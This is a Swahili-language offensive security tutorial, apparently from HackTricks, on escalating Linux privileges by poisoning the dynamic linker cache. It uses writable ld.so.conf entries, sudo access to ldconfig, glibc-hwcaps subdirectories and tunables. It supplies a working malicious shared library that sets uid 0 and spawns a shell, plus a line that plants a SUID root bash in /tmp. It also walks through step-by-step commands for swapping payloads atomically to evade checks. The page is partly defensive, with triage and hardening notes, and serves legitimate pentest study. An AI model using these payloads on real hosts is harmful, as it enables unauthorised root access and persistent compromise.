# Mfano wa exploit ya privesc ya ld.so

{{#include ../../banners/hacktricks-training.md}}

Ukurasa huu ni labu maalum ya ku-poison **system linker cache kupitia `/etc/ld.so.conf` au `ldconfig`**. Kwa library injection inayokosekana, `RPATH`/`RUNPATH` inayoweza kuandikwa, `LD_PRELOAD`, na matumizi mengine ya jumla mabaya ya SUID linker, angalia [SUID Shared Library and Linker Abuse](suid-shared-library-and-linker-abuse.md).

## Andaa mazingira

Katika sehemu ifuatayo unaweza kupata code ya files tutakazotumia kuandaa mazingira

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **Unda** faili hizo kwenye mashine yako katika folda hiyo hiyo
2. **Compile** **library**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Copy** `libcustom.so` kwenda `/usr/lib` na refresh cache: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (root privs)
4. **Compile** **executable**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Kagua mazingira

Kagua kwamba _libcustom.so_ **inaloadiwa** kutoka _/usr/lib_ na kwamba unaweza **kuexecute** binary.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### Amri muhimu za triage

Unaposhambulia target halisi, thibitisha **jina kamili la library** ambalo binary inahitaji, kile ambacho loader **inasuluhisha kwa sasa**, na ni paths zipi zilizosanidiwa zinaweza kuandikwa bila kubadilisha cache inayotumika.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>
```bash
# Needed SONAME and program interpreter
readelf -d ./sharedvuln | grep NEEDED
interp=$(readelf -l ./sharedvuln | sed -n 's/.*interpreter: \(.*\)]/\1/p')

# Cached candidates and the path selected by the loader
ldconfig -p | grep -F libcustom
"$interp" --list ./sharedvuln 2>/dev/null
"$interp" --inhibit-cache --list ./sharedvuln 2>/dev/null
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'

# Configuration, writable config objects, and every component of a configured path
grep -RnsEv '^[[:space:]]*(#|$)' /etc/ld.so.conf /etc/ld.so.conf.d 2>/dev/null
find /etc/ld.so.conf /etc/ld.so.conf.d -writable -ls 2>/dev/null
namei -l /home/ubuntu/lib

# Enumerate what ldconfig would scan without changing links (-X) or the cache (-N)
/sbin/ldconfig -N -X -v 2>/dev/null
```
Tumia `ldd` tu kwenye executable **inayoaminika**. Baadhi ya implementations au ELF interpreters zisizo za kawaida zinaweza kuifanya itekeleze code inayodhibitiwa na mshambuliaji; `objdump -p ./file | grep NEEDED` huorodhesha dependencies za moja kwa moja kwa usalama. Kwa target inayoaminika, kuita interpreter iliyogunduliwa kwa `--list` huonyesha resolution halisi. Linganisha output hiyo na `--inhibit-cache --list`: tofauti inathibitisha kuwa `/etc/ld.so.cache`, badala ya rule ya kawaida ya search-path, ndiyo iliyochagua object.<sup>[[1]](#references)[[4]](#references)</sup>

Mambo kadhaa muhimu ya kuzingatia:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` kwa kawaida **haifanyi kazi** kwa sababu redirection inafanywa na shell yako ya sasa. Tumia
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf` badala yake.
- Binaries za **SUID/privileged** huendeshwa katika **secure-execution mode**: `LD_LIBRARY_PATH`
hupuuzwa, huku `LD_PRELOAD` ikiwa na vikwazo (majina yenye slash
hupuuzwa, na libraries zilizowekewa alama ya setuid pekee katika directories za kawaida zinaweza
kupreloadiwa). Baada ya root kuendesha `ldconfig`, directories zilizoorodheshwa kwenye
`/etc/ld.so.conf` zinaweza kuingia kwenye `/etc/ld.so.cache`, hivyo misconfiguration hii bado inaweza
kuathiri programs za privileged.<sup>[[1]](#references)[[2]](#references)</sup>
- `LD_DEBUG` pia hupuuzwa katika secure-execution mode isipokuwa `/etc/suid-debug` iwepo, kwa hiyo kusanya trace yake kutoka kwenye run inayolingana isiyo ya SUID badala ya kutarajia output kutoka kwenye execution ya privileged.<sup>[[1]](#references)</sup>
- Kwenye glibc 2.33 na mpya zaidi, dynamic loader pia hutoa
`--list-diagnostics`, ambayo huchapisha diagnostics za loader zinazoweza kusomeka na machine pamoja na taarifa ya built-in search-path wakati hijack haifanyi kazi kama ilivyotarajiwa.<sup>[[1]](#references)[[6]](#references)</sup>

### Vikwazo vya Cache na SONAME

`ldconfig` hai-cache kila file la kiholela katika directory iliyosanidiwa: huchunguza ELF headers, hutambua majina yanayolingana na `lib*.so*` au `ld-*.so*`, na hutegemea chain ya kawaida ya `libfoo.so -> libfoo.so.1 -> libfoo.so.1.12`. Kwa hiyo, object iliyoingizwa lazima iwe na target architecture/class, jina kamili la `DT_NEEDED` (kwa kawaida `DT_SONAME` yake), pamoja na symbols/versions zozote ambazo victim huzisolve.<sup>[[2]](#references)</sup>
```bash
readelf -h /home/ubuntu/lib/libcustom.so | grep -E 'Class:|Machine:'
readelf -d /home/ubuntu/lib/libcustom.so | grep SONAME
readelf -Ws /home/ubuntu/lib/libcustom.so | grep vuln_func
ldconfig -p | grep -F 'libcustom.so'
```
Pendelea library inayolenga target maalum kama ilivyo kwenye mfano huu. Kufunika SONAME ya kawaida kwa object isiyokamilika kunaweza kuvuruga kila process inayoi-resolve kabla ya target yenye privileged kuanza.<sup>[[3]](#references)</sup>

### Persistence ya cached-path na atomic swaps

Cache huhifadhi mapping ya **jina la library hadi pathname**; hai-embed shared object. Baada ya pathname inayodhibitiwa na attacker kuwekwa kwenye cache, kubadilisha object iliyo kwenye path hiyo hiyo huathiri processes zinazoanzishwa baadaye bila kuendesha `ldconfig` tena. Hii huwezesha muundo muhimu wa time-of-check/time-of-use: weka library halali wazi wakati wa cache rebuild au ukaguzi wa administrator, kisha rename payload kwa atomic juu yake. Processes zilizopo huendelea kutumia object ambayo tayari ime-mapped.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
```bash
cache_path=$("$interp" --list ./sharedvuln | awk '/libcustom\.so/{print $3; exit}')
cp ./payload.so "${cache_path}.new"
mv -f "${cache_path}.new" "$cache_path"
```
Vilevile, kufuta mstari hasidi kutoka `ld.so.conf` hakutoiondoa kiotomatiki entry ambayo tayari imeandikwa: administrator lazima aondoe object isiyoaminika, arekebishe umiliki/access ya kuandika, na ajenge upya cache. Tumia ulinganisho wa `--inhibit-cache` hapo juu kutofautisha entry ya cache iliyopitwa na wakati na path ya configuration ambayo bado inatumika.<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit

Katika scenario hii, tuseme administrator ameongeza entry yenye vulnerability kwenye
file iliyo chini ya `/etc/ld.so.conf.d/` ambayo imejumuishwa na mfumo wa
`/etc/ld.so.conf`.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
Folda iliyo katika hatari ni _/home/ubuntu/lib_ (ambapo tuna access ya kuandika).\
**Pakua na compile** code ifuatayo ndani ya path hiyo:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setgid(0);
setuid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
Ikiwa unatarajia **root** (au akaunti nyingine yenye mamlaka) kutekeleza **binary** iliyo hatarini baadaye, kwa kawaida ni bora kuacha **root-owned artifact** badala ya kuanzisha **interactive shell**. Kwa mfano:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
Kisha, baada ya privileged execution kutokea, unaweza kutumia `/tmp/rootbash -p`.

Sasa kwa kuwa **tumeunda malicious libcustom library ndani ya** path **isiyosanidiwa ipasavyo**, default cache lazima ijengwe upya kupitia uendeshaji wa privileged **`ldconfig`** uliofanikiwa. Kuwasha upya mfumo husaidia tu pale ambapo mchakato wa ndani wa boot huiendesha; vinginevyo subiri kitendo cha administrator au tumia unsafe sudo rule ikiwa ipo.<sup>[[2]](#references)</sup>

Baada ya hili kutokea, **kagua tena** mahali ambapo executable ya `sharedvuln` inapakia library ya `libcustom.so` kutoka:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Kama unavyoona, **inaipakia kutoka `/home/ubuntu/lib`** na ikiwa mtumiaji yeyote ataiendesha, shell itaendeshwa:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> Kumbuka kwamba katika mfano huu hatuja- escalate privileges, lakini kwa kurekebisha commands zinazotekelezwa na **kusubiri root au mtumiaji mwingine mwenye privileges atekeleze vulnerable binary** tutaweza ku- escalate privileges.

### Modern `glibc-hwcaps` shadowing

Tangu glibc 2.33, loader inaweza kupendelea libraries zilizoboreshwa zilizo ndani ya `glibc-hwcaps/<level>/` katika **kila library search directory**. Kwa hiyo, kuangalia `/home/ubuntu/lib` pekee hakutoshi: subdirectory inayoweza kuandikwa na inayolingana, kama `/home/ubuntu/lib/glibc-hwcaps/x86-64-v3/`, inaweza kushadow base library baada ya `ldconfig` kui-index, huku CPUs nyingine zikiendelea kutumia base object. Hii pia hutoa hijack inayochagua architecture, ambayo inaweza kukosekana validation inapofanyika kwenye CPU tofauti.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# The loader prints the supported levels in priority order
"$interp" --help | sed -n '/Subdirectories of glibc-hwcaps/,$p'
find /home/ubuntu/lib/glibc-hwcaps -type d -writable -ls 2>/dev/null

# Example for a host that reports x86-64-v3 as supported
mkdir -p /home/ubuntu/lib/glibc-hwcaps/x86-64-v3
gcc -shared -fPIC -Wl,-soname,libcustom.so \
-o /home/ubuntu/lib/glibc-hwcaps/x86-64-v3/libcustom.so libcustom.c
sudo ldconfig
ldconfig -p | grep -F libcustom.so
"$interp" --list ./sharedvuln | grep -F libcustom.so
```
Mwongozo wa sasa wa hardening ya glibc unapendekeza kuepuka SONAME zinazorudiwa, maeneo ya utafutaji yasiyo ya default, na objects zilizo katika subdirectories za `glibc-hwcaps`. Kwa mtazamo wa audit, tumia ukaguzi wa ownership na writeability kwa kujirudia kwenye directories zilizosanidiwa na vipengele vyao vya parent path.<sup>[[3]](#references)</sup>

### Misconfigurations nyingine - Same vuln

Katika mfano uliotangulia, tulitengeneza misconfiguration ambapo administrator **aliweka folder isiyo na privileged ndani ya configuration file iliyo ndani ya `/etc/ld.so.conf.d/`**.\
Lakini kuna misconfigurations nyingine zinazoweza kusababisha vulnerability hiyo hiyo: ikiwa una **write permissions** katika **config file** iliyopakiwa, unaweza kuunda file katika directory ya `/etc/ld.so.conf.d/` iliyo writable, au unaweza kuandika kwenye `/etc/ld.so.conf`, unaweza kusanidi na ku-exploit vulnerability hiyo hiyo.<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit 2

**Tuseme una sudo privileges juu ya `ldconfig`**. `ldconfig` inakubali scan directories kama positional arguments, kwa hiyo njia fupi zaidi ya cache-poisoning mara nyingi huwa tu:<sup>[[2]](#references)</sup>
```bash
sudo ldconfig /tmp
```
Vinginevyo, `-f` huchagua faili nyingine ya usanidi huku ikihifadhi matokeo ya cache ya chaguo-msingi. Hii ni muhimu wakati kichujio cha argument kinapozuia saraka za positional lakini bado kinaruhusu `-f`, au wakati njia kadhaa zinapaswa kuingizwa:<sup>[[2]](#references)</sup>
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Sasa, kama ilivyoonyeshwa kwenye **previous exploit**, **unda malicious library ndani ya `/tmp`**.\
Na hatimaye, hebu tupakie path na tukague binary inapakia library kutoka wapi:
```bash
# -f changes the input configuration; the default output is still /etc/ld.so.cache
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Kama unavyoona, ukiwa na sudo privileges juu ya `ldconfig` unaweza kutumia vulnerability hiyo hiyo.** Maelezo ya options ni muhimu wakati wa kutathmini sudo rule yenye vikwazo: `-f` huchagua configuration nyingine lakini bado huunda upya `/etc/ld.so.cache`; `-C` huelekeza cache mahali pengine; `-N` huzuia kujenga upya cache; na `-X` huzuia kusasisha links lakini **bado huunda upya cache isipokuwa itumike pamoja na `-N`**. `-n` humaanisha `-N`, hivyo inaweza kusasisha links katika directories zilizotolewa lakini haiwezi ku-poison cache; `-r` hufanya kazi chini ya root mbadala na kwa kawaida haibadilishi cache ya host.<sup>[[2]](#references)</sup>

## glibc 2.44: tunables za mfumo mzima zilizohifadhiwa kwenye cache

Kuanzia glibc 2.44, `ldconfig` pia huchanganua `/etc/tunables.conf` na kuhifadhi settings zake kama extension katika `/etc/ld.so.cache`. Faili hii hukubali directives za `include` na filters za kila process. Prefixes hudhibiti scope: `@` hulenga processes za `AT_SECURE` pekee, `$` huziondoa, na `*` huzihusisha zote mbili. Hii huongeza eneo la audit zaidi ya directories za libraries: configuration ya tunables inayoweza kuandikwa au faili iliyojumuishwa inaweza kuathiri startups za programu za baadaye baada ya privileged cache rebuild.<sup>[[7]](#references)</sup>

Release hiyo hiyo inaongeza `ldconfig -t TUNCONF`, ambayo huchagua faili mbadala ya tunables huku ikiendelea kuandika cache ya kawaida isipokuwa option nyingine ibadilishe hilo. Kwa hiyo, wrappers na sudo rules zilizojaribu kuzuia `-f` pekee lazima pia zikatae `-t`, directories za positional za kiholela, na manipulation ya cache output.<sup>[[7]](#references)[[8]](#references)</sup>
```bash
# Detection / lab-only proof of cache influence
find /etc/tunables.conf -writable -ls 2>/dev/null
grep -nE '^[[:space:]]*include' /etc/tunables.conf 2>/dev/null
ldconfig --help | grep -E 'TUNCONF|tunables'
printf '*glibc.malloc.check=3\n' > /tmp/evil.tunconf
sudo ldconfig -t /tmp/evil.tunconf
"$interp" --list-tunables | grep -F glibc.malloc.check
sudo ldconfig                         # rebuild from the real configuration
```
Hii si arbitrary code execution ya moja kwa moja. Ni primitive yenye mapendeleo ya **loader-behavior manipulation**: glibc inaonya wazi kwamba thamani za mfumo mzima zinaweza kutumia security-sensitive tunables kwa programu za setuid/setgid bila uchunguzi wa usalama kwa kila tunable. Orodhesha tunables halisi za host kwa kutumia `--list-tunables` na utafute mabadiliko ya allocator yanayolenga target, mabadiliko ya CPU-hardening, au hali za denial-of-service badala ya kudhani kuna payload ya jumla.<sup>[[7]](#references)</sup>



## References

- [1] [ld.so(8) - Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [ldconfig(8) - Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [3] [Dynamic Linker Hardening - GNU C Library](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [4] [ldd(1) - Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man1/ldd.1.html)
- [5] [readelf (GNU Binary Utilities)](https://www.sourceware.org/binutils/docs/binutils/readelf.html)
- [6] [Dynamic Linker Diagnostics (GNU C Library)](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Diagnostics.html)
- [7] [System-wide Tunables (GNU C Library 2.44)](https://sourceware.org/glibc/manual/2.44/html_node/System_002dwide-Tunables.html)
- [8] [Add system-wide tunables: ldconfig part (patch v6 1/4)](https://sourceware.org/pipermail/libc-alpha/2026-March/175984.html)
{{#include ../../banners/hacktricks-training.md}}
